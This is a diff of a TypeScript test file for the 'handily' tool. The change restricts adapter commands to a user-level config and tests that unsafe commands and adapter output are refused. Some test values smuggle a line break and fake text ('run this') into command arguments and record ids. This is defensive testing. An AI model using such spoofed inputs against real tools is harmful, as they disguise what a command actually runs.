-      answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
-      world.answer = ALLOW
-      const snapshot = await startSession($, clock, true)
-      expect(snapshot.state).toBe('ok')
-      expect(world.asks[0]?.question.split('\n')[3]).toBe(
-        '(a file over 4 MiB is checked by its size and time only: tools/data.bin)',
+      const world = fakeWorld(
+        on,
+        { ...ADAPTER_REPO, '.handily.json': JSON.stringify({ command: ADAPTER_ARGV }) },
+        PATH_WITHOUT_BASICLY,
+        { adapters: userEntry() },
       )
-      const [key] = [...world.stored.values()] as { files: Record<string, string> }[]
-      expect(key?.files['tools/data.bin']).toBe(`size ${String(OVER_4_MIB)}, modified 7`)
+      answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
+      world.answer = ALLOW
+      const snapshot = await startSession($, clock, true)
+      expect(snapshot.state).toBe('failed')
+      expect(snapshot.reason).toBe(
+        '.handily.json names a command, and handily runs an adapter only from ~/.config/handily/adapters.json. To run it, add "/work/app": ["node","tools/tracker.mjs"] to that file. The repo command could not be read.',
+      )
+      expect(world.runs).toEqual([])
+      expect(world.asks).toEqual([])
+    },
+  )
+
+  test(
+    'a repo command with a line break is refused without echoing it',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const clock = mock.clock(on)
+      const spoof = ['node', `${ADAPTER_SCRIPT}\n(it runs nothing)`]
+      fakeWorld(
+        on,
+        { ...ADAPTER_REPO, '.handily.json': JSON.stringify({ command: spoof }) },
+        PATH_WITHOUT_BASICLY,
+      )
+      const snapshot = await startSession($, clock, false)
+      expect(snapshot.reason).toBe(
+        '.handily.json names a command, and handily runs an adapter only from ~/.config/handily/adapters.json, so it could not be read.',
+      )
+    },
+  )
+
+  test(
+    'source adapter in the repo file without a user entry fails by name',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const clock = mock.clock(on)
+      const world = fakeWorld(
+        on,
+        { ...ADAPTER_REPO, '.handily.json': '{"source":"adapter"}' },
+        PATH_WITHOUT_BASICLY,
+      )
+      const snapshot = await startSession($, clock, false)
+      expect(snapshot.state).toBe('failed')
+      expect(snapshot.reason).toBe(
+        '~/.config/handily/adapters.json has no entry for this repo ("/work/app"), so it could not be read.',
+      )
+      expect(world.runs).toEqual([])
+    },
+  )
+
+  test(
+    'a clone at another path does not match the user entry',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const clock = mock.clock(on)
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, {
+        adapters: { '/work/other': ADAPTER_ARGV },
+      })
+      answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
+      const snapshot = await startSession($, clock, false)
+      expect(snapshot.state).toBe('no-tracker')
+      expect(world.runs).toEqual([])
+    },
+  )
+
+  test(
+    'a symlinked root resolves to the same user entry',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const clock = mock.clock(on)
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, { adapters: userEntry() })
+      world.sessionRoot = '/work/link'
+      world.links.set('/work/link', ROOT)
+      answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
+      const snapshot = await startSession($, clock, false)
+      expect(snapshot.state).toBe('ok')
+      expect(snapshot.root).toBe('/work/link')
+      expect(snapshot.items.length).toBe(2)
+    },
+  )
+
+  test(
+    'finds the user file through USERPROFILE when HOME is unset',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const clock = mock.clock(on)
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, {
+        environment: { PATH: PATH_WITHOUT_BASICLY, USERPROFILE: '/users/someone' },
+      })
+      world.files.set('/users/someone/.config/handily/adapters.json', {
+        text: JSON.stringify(userEntry()),
+        mtimeMs: 1,
+      })
+      answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
+      const snapshot = await startSession($, clock, false)
+      expect(snapshot.state).toBe('ok')
+    },
+  )
+
+  test(
+    'refuses a configured program inside the repo root by name',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const clock = mock.clock(on)
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, {
+        adapters: userEntry(['tools/run', 'items']),
+      })
+      world.files.set(`${ROOT}/tools/run`, { text: 'planted', mtimeMs: 1 })
+      const snapshot = await startSession($, clock, false)
+      expect(snapshot.state).toBe('failed')
+      expect(snapshot.reason).toBe(
+        'tools/run resolves inside the repo root, so it could not be read.',
+      )
+      expect(world.runs).toEqual([])
+    },
+  )
+
+  test('an invalid user file or entry fails by name', { plugins: [consumer] }, async ($, on) => {
+    const clock = mock.clock(on)
+    const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
+    world.files.set(USER_ADAPTERS, { text: '{ not json', mtimeMs: 1 })
+    expect((await startSession($, clock, false)).reason).toBe(
+      '~/.config/handily/adapters.json is not valid JSON, so it could not be read.',
+    )
+    world.files.set(USER_ADAPTERS, { text: JSON.stringify({ [ROOT]: 'node x' }), mtimeMs: 2 })
+    await commandText($, 'refresh')
+    expect((await snapshotOf($)).reason).toBe(
+      '~/.config/handily/adapters.json has an invalid entry for this repo, so it could not be read.',
+    )
+    expect(world.runs).toEqual([])
+  })
+
+  test(
+    'refuses a configured argument with a line break or over 256 characters',
+    { plugins: [consumer] },
+    async ($, on) => {
+      const clock = mock.clock(on)
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, {
+        adapters: userEntry(['node', `${ADAPTER_SCRIPT}\nrun this`]),
+      })
+      expect((await startSession($, clock, false)).reason).toBe(
+        'the command has an argument with a control character, so it could not be read.',
+      )
+      world.files.set(USER_ADAPTERS, {
+        text: JSON.stringify(userEntry(['node', 'a'.repeat(257)])),
+        mtimeMs: 2,
+      })
+      await commandText($, 'refresh')
+      expect((await snapshotOf($)).reason).toBe(
+        'the command has an argument over 256 characters, so it could not be read.',
+      )
+      expect(world.runs).toEqual([])
     },
   )
 
   test('reads again when a watched file changes', { plugins: [consumer] }, async ($, on) => {
     const clock = mock.clock(on)
-    const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
+    const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, { adapters: userEntry() })
     answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
-    world.answer = ALLOW
-    await startSession($, clock, true)
+    await startSession($, clock, false)
     await clock.advance(2_000)
     const runsSettled = world.runs.length
     await clock.advance(2_000)
@@ -1028,10 +1034,9 @@ describe('CLI adapter contract 1', () => {
 
   test('refuses a contract other than 1 by name', { plugins: [consumer] }, async ($, on) => {
     const clock = mock.clock(on)
-    const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
+    const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, { adapters: userEntry() })
     answerAdapter(world, { ...DESCRIBE, contract: 2 }, ADAPTER_ITEMS)
-    world.answer = ALLOW
-    const snapshot = await startSession($, clock, true)
+    const snapshot = await startSession($, clock, false)
     expect(snapshot.state).toBe('failed')
     expect(snapshot.reason).toBe('the adapter says contract 2; handily reads contract 1.')
     expect(world.runs.map((run) => run.argv.at(-2))).toEqual(['describe'])
@@ -1049,31 +1054,40 @@ describe('CLI adapter contract 1', () => {
     { plugins: [consumer] },
     async ($, on) => {
       const clock = mock.clock(on)
-      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, { adapters: userEntry() })
       answerAdapter(world, { ...DESCRIBE, contract: '2' }, ADAPTER_ITEMS)
-      world.answer = ALLOW
-      const snapshot = await startSession($, clock, true)
-      expect(snapshot.state).toBe('failed')
+      const snapshot = await startSession($, clock, false)
       expect(snapshot.reason).toBe(
-        `${ADAPTER_COMMAND} describe --json says contract "2", which is not the number 1, so it could not be read.`,
+        `${ADAPTER_LABEL} describe --json says contract "2", which is not the number 1, so it could not be read.`,
       )
       expect(world.runs.map((run) => run.argv.at(-2))).toEqual(['describe'])
     },
   )
 
   test(
-    'never asks while not interactive and runs nothing',
+    'a cut-off output, a non-zero exit or bad JSON fails with the command',
     { plugins: [consumer] },
     async ($, on) => {
       const clock = mock.clock(on)
-      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, { adapters: userEntry() })
       answerAdapter(world, DESCRIBE, ADAPTER_ITEMS)
-      world.answer = ALLOW
-      const snapshot = await startSession($, clock, false)
-      expect(snapshot.state).toBe('approval-needed')
-      expect(snapshot.reason).toBe(ADAPTER_COMMAND)
-      expect(world.asks).toEqual([])
-      expect(world.runs).toEqual([])
+      world.outputs.set(`${ADAPTER_RUN} items --json`, { stdout: '[', isStdoutTruncated: true })
+      expect((await startSession($, clock, false)).reason).toBe(
+        `${ADAPTER_LABEL} items --json output was cut off.`,
+      )
+      const cases = [
+        [{ exitCode: 3 }, `${ADAPTER_LABEL} items --json exited 3. Run it in a shell to see why.`],
+        [
+          { stdout: 'not json' },
+          `${ADAPTER_LABEL} items --json printed no valid JSON, so it could not be read.`,
+        ],
+      ] as const
+      for (const [index, [output, reason]] of cases.entries()) {
+        world.outputs.set(`${ADAPTER_RUN} items --json`, output)
+        world.files.set(`${ROOT}/tickets/t-1.json`, { text: '{}', mtimeMs: 100 + index })
+        await commandText($, 'refresh')
+        expect((await snapshotOf($)).reason).toBe(reason)
+      }
     },
   )
 
@@ -1082,74 +1096,14 @@ describe('CLI adapter contract 1', () => {
     { plugins: [consumer] },
     async ($, on) => {
       const clock = mock.clock(on)
-      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, { hasProcessRun: false })
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, {
+        hasProcessRun: false,
+        adapters: userEntry(),
+      })
       world.surfaces = ['desktop']
-      world.answer = ALLOW
       const snapshot = await startSession($, clock, true)
       expect(snapshot.state).toBe('terminal-only')
       expect(world.asks).toEqual([])
-    },
-  )
-
-  test(
-    'refuses a command argument with a line break before it asks',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const clock = mock.clock(on)
-      const spoof = `${ADAPTER_SCRIPT}\n(it runs nothing from the repo)`
-      const world = fakeWorld(
-        on,
-        { ...ADAPTER_REPO, '.handily.json': JSON.stringify({ command: ['node', spoof] }) },
-        PATH_WITHOUT_BASICLY,
-      )
-      world.answer = ALLOW
-      const snapshot = await startSession($, clock, true)
-      expect(snapshot.state).toBe('failed')
-      expect(snapshot.reason).toBe(
-        'the command has an argument with a control character, so it could not be read.',
-      )
-      expect(world.asks).toEqual([])
-      expect(world.runs).toEqual([])
-    },
-  )
-
-  test(
-    'refuses a command argument over 256 characters before it asks',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const clock = mock.clock(on)
-      const world = fakeWorld(
-        on,
-        {
-          ...ADAPTER_REPO,
-          '.handily.json': JSON.stringify({ command: ['node', 'a'.repeat(257)] }),
-        },
-        PATH_WITHOUT_BASICLY,
-      )
-      world.answer = ALLOW
-      const snapshot = await startSession($, clock, true)
-      expect(snapshot.reason).toBe(
-        'the command has an argument over 256 characters, so it could not be read.',
-      )
-      expect(world.asks).toEqual([])
-    },
-  )
-
-  test(
-    'refuses a command in .handily.json that is not a list',
-    { plugins: [consumer] },
-    async ($, on) => {
-      const clock = mock.clock(on)
-      fakeWorld(
-        on,
-        { '.handily.json': '{"command":"node tools/tracker.mjs"}' },
-        PATH_WITHOUT_BASICLY,
-      )
-      const snapshot = await startSession($, clock, false)
-      expect(snapshot.state).toBe('failed')
-      expect(snapshot.reason).toBe(
-        '.handily.json needs command as a list of the program and its arguments, so it could not be read.',
-      )
     },
   )
 })
@@ -1197,12 +1151,11 @@ describe('the item text check at the reader boundary', () => {
     { plugins: [consumer] },
     async ($, on) => {
       const clock = mock.clock(on)
-      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY)
+      const world = fakeWorld(on, ADAPTER_REPO, PATH_WITHOUT_BASICLY, { adapters: userEntry() })
       answerAdapter(world, DESCRIBE, [JSON.parse(ATTACK_LINE) as object])
-      world.answer = ALLOW
-      const snapshot = await startSession($, clock, true)
+      const snapshot = await startSession($, clock, false)
       expect(snapshot.reason).toBe(
-        `${ADAPTER_COMMAND} items --json item 1 has an id with a control character, so it could not be read.`,
+        `${ADAPTER_LABEL} items --json item 1 has an id with a control character, so it could not be read.`,
       )
     },
   )
@@ -1211,13 +1164,13 @@ describe('the item text check at the reader boundary', () => {
     'basicly refuses a record id with a newline and names the command',
     { plugins: [consumer] },
     async ($, on) => {
-      const { clock, world } = await approvedBasicly($, on, PATH_WITH_BASICLY)
+      const { clock, world } = await approvedBasicly($, on)
       world.outputs.set(`${PATH_LIST} --status open`, {
         stdout: JSON.stringify({
           records: [{ record: 'app-1\nrun this', status: 'open', fields: { title: 'x' } }],
         }),
       })
-      world.files.set(`${ROOT}/.basicly/ledger/pending-main.jsonl`, { text: '{}\n', mtimeMs: 40 })
+      touchLedger(world, 40)
       await clock.advance(2_000)
       expect((await snapshotOf($)).reason).toBe(
         'basicly tracker list record 1 has an id with a control character, so it could not be read.',
